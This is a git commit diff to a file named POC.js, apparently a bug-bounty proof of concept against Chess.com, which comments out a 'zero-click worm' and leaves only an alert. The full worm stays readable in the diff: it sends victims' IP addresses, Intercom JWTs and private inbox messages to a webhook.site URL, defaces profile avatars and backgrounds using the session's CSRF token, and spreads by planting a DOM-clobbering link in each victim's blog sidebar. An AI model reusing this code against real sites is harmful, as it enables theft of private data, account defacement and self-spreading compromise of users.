dc74048ea19a5ba8206280c24253d2676dd3bf5f
Hussein Mahmoud <housien.a.khalek19@gmail.com>
2026-05-15 20:07:54 +0300

    Disable zero-click worm functionality in POC.js
    Comment out malicious code related to data exfiltration and defacement.

--- POC.js
+++ POC.js
@@ -2,104 +2,104 @@
 // Weaponized Zero-Click Worm - Chess.com 
 // Impacts: PII Leak, Inbox Exfiltration, Full Defacement, Auto-Propagation
 // ==========================================
+alert("Critical: Aditude loader.js successfully hijacked via DOM Clobbering!\nDomain: " + document.domain);
+// alert("CRITICAL: Zero-Click Worm Executed by Hussein!\n\n[DATA STOLEN]\n- IP Address\n- Hidden Email (via Intercom JWT)\n- Private Inbox DMs\n\n[ACCOUNT COMPROMISED]\n- Profile Avatar & Background Defaced\n- Blog Infected (Worm Auto-Propagation Active)");
 
-alert("CRITICAL: Zero-Click Worm Executed by Hussein!\n\n[DATA STOLEN]\n- IP Address\n- Hidden Email (via Intercom JWT)\n- Private Inbox DMs\n\n[ACCOUNT COMPROMISED]\n- Profile Avatar & Background Defaced\n- Blog Infected (Worm Auto-Propagation Active)");
+// const webhook = 'https://webhook.site/b2736906-d37d-48c0-9a83-ecd2ff48a039'; 
+// const csrfToken = window.context.csrf.token;
+// const username = window.context.user.username;
 
-const webhook = 'https://webhook.site/b2736906-d37d-48c0-9a83-ecd2ff48a039'; 
-const csrfToken = window.context.csrf.token;
-const username = window.context.user.username;
+// // 1. PII & Token Leakage (Exfiltrate IP and Intercom JWT immediately)
+// try {
+//     const victimIP = window.context.ip;
+//     const jwtToken = window.context.user.intercomUserJwt; 
+//     fetch(webhook + '?stolen_ip=' + victimIP + '&stolen_jwt=' + jwtToken, { mode: 'no-cors' });
+// } catch(e) {}
 
-// 1. PII & Token Leakage (Exfiltrate IP and Intercom JWT immediately)
-try {
-    const victimIP = window.context.ip;
-    const jwtToken = window.context.user.intercomUserJwt; 
-    fetch(webhook + '?stolen_ip=' + victimIP + '&stolen_jwt=' + jwtToken, { mode: 'no-cors' });
-} catch(e) {}
+// // 2. Account Data Leakage (Exfiltrate Inbox DMs)
+// try {
+//     fetch('https://www.chess.com/callback/messages/list/inbox', {
+//         method: 'GET',
+//         headers: { 'Accept': 'application/json' },
+//         credentials: 'include'
+//     })
+//     .then(response => response.text())
+//     .then(data => {
+//         fetch(webhook, { method: 'POST', body: "===== STOLEN DMs =====\n" + data, mode: 'no-cors' });
+//     });
+// } catch(e) {}
 
-// 2. Account Data Leakage (Exfiltrate Inbox DMs)
-try {
-    fetch('https://www.chess.com/callback/messages/list/inbox', {
-        method: 'GET',
-        headers: { 'Accept': 'application/json' },
-        credentials: 'include'
-    })
-    .then(response => response.text())
-    .then(data => {
-        fetch(webhook, { method: 'POST', body: "===== STOLEN DMs =====\n" + data, mode: 'no-cors' });
-    });
-} catch(e) {}
+// // 3. Avatar Defacement (Profile Avatar Modification via RPC)
+// try {
+//     fetch("https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/UpdateProfileAvatar", {
+//         method: "POST",
+//         credentials: "include", 
+//         headers: {
+//             "Content-Type": "application/json",
+//             "Accept": "application/json, text/plain, */*",
+//             "Connect-Protocol-Version": "1"
+//         },
+//         body: JSON.stringify({
+//             content: "iVBORw0KGgoAAAANSUhEUgAAAJYAAACUCAMAAABGFyDbAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAACTUExURf////r///H//+Dq6trV1dy8vNuoqNyQkOCLi+R7e/f//+/v7+7Y2OnJydiUlN5oaOAXF+0AAP8AANtfX+Tj49iqquhzc+1TU+0KCvcAAO/p6enOztd+ftrOzuxBQfQAANadnd4uLucyMtl5eebY2N5YWNxMTNzCwvsAAO0vL+0lJdixsfMdHeIkJN5EROO2tu9gYHcVvsQAAAABYktHRACIBR1IAAAAB3RJTUUH6gIJFg0VvBvLygAAADB0RVh0Y29tbWVudAAvPjxzY3JpcHQ+YWxlcnQoIlhTU19TVUNDRVNTIik7PC9zY3JpcHQ+GPVOugAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNi0wMi0wOVQyMjoxMjoxNyswMDowMJrmdFYAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjYtMDItMDlUMjI6MTI6MTErMDA6MDCIa/nQAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDI2LTAyLTA5VDIyOjEzOjIxKzAwOjAwvjO00gAAA7pJREFUeNrtnItyqjAQhkG8oGjRqIhKvSC1trW17/90h6gMoKBckuw/0/O9AP8ky+4m2V1N+w8Fegi1hgQNo9lqd0yzG2KanXaraTQo9fSs/uDFHo7YHaPhuDPoWz31mvTJ1Jm5c5bL3J057YnKbdUXS2/ICjH0lgs10vRXc7UuJoqzXpmv0oXpi822uKSI7UbukhmeX14Ux98Z0lYqGM+riTr/AuNAyooZjltdFMd1xK+Y5ZUw8zzWniV2/6ar+qI4q6nAnQzexIjivPUFiepNaxpVGncqJChZe5GiOHsBFvbui1YVerH3uhu4ES+Ks6m1kQ37IEfWwa6Rk02Em1XMflJZlS9PVWhgFXUtP2SqYuxjWUVVU6i3ymLUrLBWn7JVMfZZer0m0tfqvF4l7SvwVagK7T4oo6qhSFWoq4T/ssaqVDE2Lh4gd5J8exaHXVFVX+pEcb4KmvtRraxjIbNvfKtVxdh3AbPXTdWqGDOfJ/itGmfBqsxbT7dQiXe/xX2yjRRbyHmyjctR/U9UYfQwaOs/NKoY+3m0XC0qVYw9sHqLbLEYm+XHxo3CWHjLYYPlHCJynUSbUhVj7RzLmtHKyrGuE0HYSTI/Zcoi/A0v/GSpalKrYizj3EgVDZNkRMaFoNvROqwW93GH2OA5GXmXTa2JY995eKKMJs3o1tO/Uyu6cHOpqnvUgi546X+ROvBE3ASgvuIjax7H9BvHiTDTSnJIx0UQ0wqNKyVL+QE/j++U1xLwWCiGddJzAWQPEcksQvGN1iOSt10ASU2EmfDxDrWYGCf2871fajExv/GTHkro4STCz8KnFhPjxxlqX8H7TlE+46hIdauVReKmawnj5EM3Dy9rgCRrEMsCOIxFzPFlYW4iqMmjysJ0p6DBBzRUgyY2oGkgaNIMesRAPZCBHl9BD/tawWYB+aSuRlAvkkCv3UAvKVHCz82VLugFOOhzAerjCuhTFOrDHegzJ+ijMEIWkVl6jVlwgFqeQR2A8kqlMEt/UAulaMvK8hYLtggPtGQRtcATtBwWtXgYtNQatTAdtYwftOkBtUUEtaEGtf0ItVlLa1QY+lCNbanWXMxGQFVtk27ptlzMJlMVLbluhZZc1AZm1HZv1OZ41FECqIMXNNAxFRrqUA/UESia4IExJaPgIzDH62igw4g4hlMzx5cxuonvZGDXGXRlB9JG0Bk7v5ooiWPBzisGOUTtrAxw5Nx1yQAH9F2l4Y0zvPJo+KP9QjP8MSYalbnrdncIozLT6DrYZNE/xD/Km2hTBSqgTgAAAABJRU5ErkJggg==",
+//             filename: "user-avatar"
+//         })
+//     });
+// } catch(e) {}
 
-// 3. Avatar Defacement (Profile Avatar Modification via RPC)
-try {
-    fetch("https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/UpdateProfileAvatar", {
-        method: "POST",
-        credentials: "include", 
-        headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json, text/plain, */*",
-            "Connect-Protocol-Version": "1"
-        },
-        body: JSON.stringify({
-            content: "iVBORw0KGgoAAAANSUhEUgAAAJYAAACUCAMAAABGFyDbAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAACTUExURf////r///H//+Dq6trV1dy8vNuoqNyQkOCLi+R7e/f//+/v7+7Y2OnJydiUlN5oaOAXF+0AAP8AANtfX+Tj49iqquhzc+1TU+0KCvcAAO/p6enOztd+ftrOzuxBQfQAANadnd4uLucyMtl5eebY2N5YWNxMTNzCwvsAAO0vL+0lJdixsfMdHeIkJN5EROO2tu9gYHcVvsQAAAABYktHRACIBR1IAAAAB3RJTUUH6gIJFg0VvBvLygAAADB0RVh0Y29tbWVudAAvPjxzY3JpcHQ+YWxlcnQoIlhTU19TVUNDRVNTIik7PC9zY3JpcHQ+GPVOugAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNi0wMi0wOVQyMjoxMjoxNyswMDowMJrmdFYAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjYtMDItMDlUMjI6MTI6MTErMDA6MDCIa/nQAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDI2LTAyLTA5VDIyOjEzOjIxKzAwOjAwvjO00gAAA7pJREFUeNrtnItyqjAQhkG8oGjRqIhKvSC1trW17/90h6gMoKBckuw/0/O9AP8ky+4m2V1N+w8Fegi1hgQNo9lqd0yzG2KanXaraTQo9fSs/uDFHo7YHaPhuDPoWz31mvTJ1Jm5c5bL3J057YnKbdUXS2/ICjH0lgs10vRXc7UuJoqzXpmv0oXpi822uKSI7UbukhmeX14Ux98Z0lYqGM+riTr/AuNAyooZjltdFMd1xK+Y5ZUw8zzWniV2/6ar+qI4q6nAnQzexIjivPUFiepNaxpVGncqJChZe5GiOHsBFvbui1YVerH3uhu4ES+Ks6m1kQ37IEfWwa6Rk02Em1XMflJZlS9PVWhgFXUtP2SqYuxjWUVVU6i3ymLUrLBWn7JVMfZZer0m0tfqvF4l7SvwVagK7T4oo6qhSFWoq4T/ssaqVDE2Lh4gd5J8exaHXVFVX+pEcb4KmvtRraxjIbNvfKtVxdh3AbPXTdWqGDOfJ/itGmfBqsxbT7dQiXe/xX2yjRRbyHmyjctR/U9UYfQwaOs/NKoY+3m0XC0qVYw9sHqLbLEYm+XHxo3CWHjLYYPlHCJynUSbUhVj7RzLmtHKyrGuE0HYSTI/Zcoi/A0v/GSpalKrYizj3EgVDZNkRMaFoNvROqwW93GH2OA5GXmXTa2JY995eKKMJs3o1tO/Uyu6cHOpqnvUgi546X+ROvBE3ASgvuIjax7H9BvHiTDTSnJIx0UQ0wqNKyVL+QE/j++U1xLwWCiGddJzAWQPEcksQvGN1iOSt10ASU2EmfDxDrWYGCf2871fajExv/GTHkro4STCz8KnFhPjxxlqX8H7TlE+46hIdauVReKmawnj5EM3Dy9rgCRrEMsCOIxFzPFlYW4iqMmjysJ0p6DBBzRUgyY2oGkgaNIMesRAPZCBHl9BD/tawWYB+aSuRlAvkkCv3UAvKVHCz82VLugFOOhzAerjCuhTFOrDHegzJ+ijMEIWkVl6jVlwgFqeQR2A8kqlMEt/UAulaMvK8hYLtggPtGQRtcATtBwWtXgYtNQatTAdtYwftOkBtUUEtaEGtf0ItVlLa1QY+lCNbanWXMxGQFVtk27ptlzMJlMVLbluhZZc1AZm1HZv1OZ41FECqIMXNNAxFRrqUA/UESia4IExJaPgIzDH62igw4g4hlMzx5cxuonvZGDXGXRlB9JG0Bk7v5ooiWPBzisGOUTtrAxw5Nx1yQAH9F2l4Y0zvPJo+KP9QjP8MSYalbnrdncIozLT6DrYZNE/xD/Km2hTBSqgTgAAAABJRU5ErkJggg==",
-            filename: "user-avatar"
-        })
-    });
-} catch(e) {}
+// // 4. Background Defacement (Profile Background Modification)
+// try {
+//     const b64Data = 'iVBORw0KGgoAAAANSUhEUgAAAJYAAACUCAMAAABGFyDbAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAACTUExURf////r///H//+Dq6trV1dy8vNuoqNyQkOCLi+R7e/f//+/v7+7Y2OnJydiUlN5oaOAXF+0AAP8AANtfX+Tj49iqquhzc+1TU+0KCvcAAO/p6enOztd+ftrOzuxBQfQAANadnd4uLucyMtl5eebY2N5YWNxMTNzCwvsAAO0vL+0lJdixsfMdHeIkJN5EROO2tu9gYHcVvsQAAAABYktHRACIBR1IAAAAB3RJTUUH6gIJFg0VvBvLygAAADB0RVh0Y29tbWVudAAvPjxzY3JpcHQ+YWxlcnQoIlhTU19TVUNDRVNTIik7PC9zY3JpcHQ+GPVOugAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNi0wMi0wOVQyMjoxMjoxNyswMDowMJrmdFYAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjYtMDItMDlUMjI6MTI6MTErMDA6MDCIa/nQAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDI2LTAyLTA5VDIyOjEzOjIxKzAwOjAwvjO00gAAA7pJREFUeNrtnItyqjAQhkG8oGjRqIhKvSC1trW17/90h6gMoKBckuw/0/O9AP8ky+4m2V1N+w8Fegi1hgQNo9lqd0yzG2KanXaraTQo9fSs/uDFHo7YHaPhuDPoWz31mvTJ1Jm5c5bL3J057YnKbdUXS2/ICjH0lgs10vRXc7UuJoqzXpmv0oXpi822uKSI7UbukhmeX14Ux98Z0lYqGM+riTr/AuNAyooZjltdFMd1xK+Y5ZUw8zzWniV2/6ar+qI4q6nAnQzexIjivPUFiepNaxpVGncqJChZe5GiOHsBFvbui1YVerH3uhu4ES+Ks6m1kQ37IEfWwa6Rk02Em1XMflJZlS9PVWhgFXUtP2SqYuxjWUVVU6i3ymLUrLBWn7JVMfZZer0m0tfqvF4l7SvwVagK7T4oo6qhSFWoq4T/ssaqVDE2Lh4gd5J8exaHXVFVX+pEcb4KmvtRraxjIbNvfKtVxdh3AbPXTdWqGDOfJ/itGmfBqsxbT7dQiXe/xX2yjRRbyHmyjctR/U9UYfQwaOs/NKoY+3m0XC0qVYw9sHqLbLEYm+XHxo3CWHjLYYPlHCJynUSbUhVj7RzLmtHKyrGuE0HYSTI/Zcoi/A0v/GSpalKrYizj3EgVDZNkRMaFoNvROqwW93GH2OA5GXmXTa2JY995eKKMJs3o1tO/Uyu6cHOpqnvUgi546X+ROvBE3ASgvuIjax7H9BvHiTDTSnJIx0UQ0wqNKyVL+QE/j++U1xLwWCiGddJzAWQPEcksQvGN1iOSt10ASU2EmfDxDrWYGCf2871fajExv/GTHkro4STCz8KnFhPjxxlqX8H7TlE+46hIdauVReKmawnj5EM3Dy9rgCRrEMsCOIxFzPFlYW4iqMmjysJ0p6DBBzRUgyY2oGkgaNIMesRAPZCBHl9BD/tawWYB+aSuRlAvkkCv3UAvKVHCz82VLugFOOhzAerjCuhTFOrDHegzJ+ijMEIWkVl6jVlwgFqeQR2A8kqlMEt/UAulaMvK8hYLtggPtGQRtcATtBwWtXgYtNQatTAdtYwftOkBtUUEtaEGtf0ItVlLa1QY+lCNbanWXMxGQFVtk27ptlzMJlMVLbluhZZc1AZm1HZv1OZ41FECqIMXNNAxFRrqUA/UESia4IExJaPgIzDH62igw4g4hlMzx5cxuonvZGDXGXRlB9JG0Bk7v5ooiWPBzisGOUTtrAxw5Nx1yQAH9F2l4Y0zvPJo+KP9QjP8MSYalbnrdncIozLT6DrYZNE/xD/Km2hTBSqgTgAAAABJRU5ErkJggg==';
+//     const byteCharacters = atob(b64Data);
+//     const byteNumbers = new Array(byteCharacters.length);
+//     for (let i = 0; i < byteCharacters.length; i++) {
+//         byteNumbers[i] = byteCharacters.charCodeAt(i);
+//     }
+//     const byteArray = new Uint8Array(byteNumbers);
+//     const blob = new Blob([byteArray], {type: 'image/png'});
+//     const formData = new FormData();
+//     formData.append('file', blob, 'infected.png');
 
-// 4. Background Defacement (Profile Background Modification)
-try {
-    const b64Data = 'iVBORw0KGgoAAAANSUhEUgAAAJYAAACUCAMAAABGFyDbAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAACTUExURf////r///H//+Dq6trV1dy8vNuoqNyQkOCLi+R7e/f//+/v7+7Y2OnJydiUlN5oaOAXF+0AAP8AANtfX+Tj49iqquhzc+1TU+0KCvcAAO/p6enOztd+ftrOzuxBQfQAANadnd4uLucyMtl5eebY2N5YWNxMTNzCwvsAAO0vL+0lJdixsfMdHeIkJN5EROO2tu9gYHcVvsQAAAABYktHRACIBR1IAAAAB3RJTUUH6gIJFg0VvBvLygAAADB0RVh0Y29tbWVudAAvPjxzY3JpcHQ+YWxlcnQoIlhTU19TVUNDRVNTIik7PC9zY3JpcHQ+GPVOugAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNi0wMi0wOVQyMjoxMjoxNyswMDowMJrmdFYAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjYtMDItMDlUMjI6MTI6MTErMDA6MDCIa/nQAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDI2LTAyLTA5VDIyOjEzOjIxKzAwOjAwvjO00gAAA7pJREFUeNrtnItyqjAQhkG8oGjRqIhKvSC1trW17/90h6gMoKBckuw/0/O9AP8ky+4m2V1N+w8Fegi1hgQNo9lqd0yzG2KanXaraTQo9fSs/uDFHo7YHaPhuDPoWz31mvTJ1Jm5c5bL3J057YnKbdUXS2/ICjH0lgs10vRXc7UuJoqzXpmv0oXpi822uKSI7UbukhmeX14Ux98Z0lYqGM+riTr/AuNAyooZjltdFMd1xK+Y5ZUw8zzWniV2/6ar+qI4q6nAnQzexIjivPUFiepNaxpVGncqJChZe5GiOHsBFvbui1YVerH3uhu4ES+Ks6m1kQ37IEfWwa6Rk02Em1XMflJZlS9PVWhgFXUtP2SqYuxjWUVVU6i3ymLUrLBWn7JVMfZZer0m0tfqvF4l7SvwVagK7T4oo6qhSFWoq4T/ssaqVDE2Lh4gd5J8exaHXVFVX+pEcb4KmvtRraxjIbNvfKtVxdh3AbPXTdWqGDOfJ/itGmfBqsxbT7dQiXe/xX2yjRRbyHmyjctR/U9UYfQwaOs/NKoY+3m0XC0qVYw9sHqLbLEYm+XHxo3CWHjLYYPlHCJynUSbUhVj7RzLmtHKyrGuE0HYSTI/Zcoi/A0v/GSpalKrYizj3EgVDZNkRMaFoNvROqwW93GH2OA5GXmXTa2JY995eKKMJs3o1tO/Uyu6cHOpqnvUgi546X+ROvBE3ASgvuIjax7H9BvHiTDTSnJIx0UQ0wqNKyVL+QE/j++U1xLwWCiGddJzAWQPEcksQvGN1iOSt10ASU2EmfDxDrWYGCf2871fajExv/GTHkro4STCz8KnFhPjxxlqX8H7TlE+46hIdauVReKmawnj5EM3Dy9rgCRrEMsCOIxFzPFlYW4iqMmjysJ0p6DBBzRUgyY2oGkgaNIMesRAPZCBHl9BD/tawWYB+aSuRlAvkkCv3UAvKVHCz82VLugFOOhzAerjCuhTFOrDHegzJ+ijMEIWkVl6jVlwgFqeQR2A8kqlMEt/UAulaMvK8hYLtggPtGQRtcATtBwWtXgYtNQatTAdtYwftOkBtUUEtaEGtf0ItVlLa1QY+lCNbanWXMxGQFVtk27ptlzMJlMVLbluhZZc1AZm1HZv1OZ41FECqIMXNNAxFRrqUA/UESia4IExJaPgIzDH62igw4g4hlMzx5cxuonvZGDXGXRlB9JG0Bk7v5ooiWPBzisGOUTtrAxw5Nx1yQAH9F2l4Y0zvPJo+KP9QjP8MSYalbnrdncIozLT6DrYZNE/xD/Km2hTBSqgTgAAAABJRU5ErkJggg==';
-    const byteCharacters = atob(b64Data);
-    const byteNumbers = new Array(byteCharacters.length);
-    for (let i = 0; i < byteCharacters.length; i++) {
-        byteNumbers[i] = byteCharacters.charCodeAt(i);
-    }
-    const byteArray = new Uint8Array(byteNumbers);
-    const blob = new Blob([byteArray], {type: 'image/png'});
-    const formData = new FormData();
-    formData.append('file', blob, 'infected.png');
+//     fetch('https://www.chess.com/callback/member/upload/background', {
+//         method: 'POST',
+//         headers: { 
+//             'X-Chesscom-Csrf-Token': csrfToken,
+//             'Accept': 'application/json' 
+//         },
+//         body: formData,
+//         credentials: 'include'
+//     });
+// } catch(e) {}
 
-    fetch('https://www.chess.com/callback/member/upload/background', {
-        method: 'POST',
-        headers: { 
-            'X-Chesscom-Csrf-Token': csrfToken,
-            'Accept': 'application/json' 
-        },
-        body: formData,
-        credentials: 'include'
-    });
-} catch(e) {}
-
-// 5. Self-Propagation (The Worm Infection via RPC)
-try {
-    const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
+// // 5. Self-Propagation (The Worm Infection via RPC)
+// try {
+//     const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
     
-    // The exact DOM Clobbering payload hosted on your GitHub
-    const maliciousSidebar = `<p>Hey, check out this cool trick! <a id="__tudeConfig"></a><a id="__tudeConfig" href="https://hussein-e4.github.io/POC.js" name="endpoint"></a></p>`;
+//     // The exact DOM Clobbering payload hosted on your GitHub
+//     const maliciousSidebar = `<p>Hey, check out this cool trick! <a id="__tudeConfig"></a><a id="__tudeConfig" href="https://hussein-e4.github.io/POC.js" name="endpoint"></a></p>`;
     
-    const requestBody = {
-        "blogDetails": {
-            "url": username, 
-            "name": username + " blog",
-            "privacy": "BLOG_PRIVACY_ID_EVERYONE", 
-            "sidebarBlock": maliciousSidebar
-        },
-        "updateMask": ""
-    };
+//     const requestBody = {
+//         "blogDetails": {
+//             "url": username, 
+//             "name": username + " blog",
+//             "privacy": "BLOG_PRIVACY_ID_EVERYONE", 
+//             "sidebarBlock": maliciousSidebar
+//         },
+//         "updateMask": ""
+//     };
 
-    fetch(apiUrl, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json, text/plain, */*',
-            'Connect-Protocol-Version': '1'
-        },
-        credentials: 'include', 
-        body: JSON.stringify(requestBody)
-    })
-    .then(response => {
-        if (response.ok) {
-            fetch(webhook + "?impact=Worm_Propagated_Successfully", { mode: 'no-cors' });
-        }
-    });
+//     fetch(apiUrl, {
+//         method: 'POST',
+//         headers: {
+//             'Content-Type': 'application/json',
+//             'Accept': 'application/json, text/plain, */*',
+//             'Connect-Protocol-Version': '1'
+//         },
+//         credentials: 'include', 
+//         body: JSON.stringify(requestBody)
+//     })
+//     .then(response => {
+//         if (response.ok) {
+//             fetch(webhook + "?impact=Worm_Propagated_Successfully", { mode: 'no-cors' });
+//         }
+//     });
 } catch(e) {}
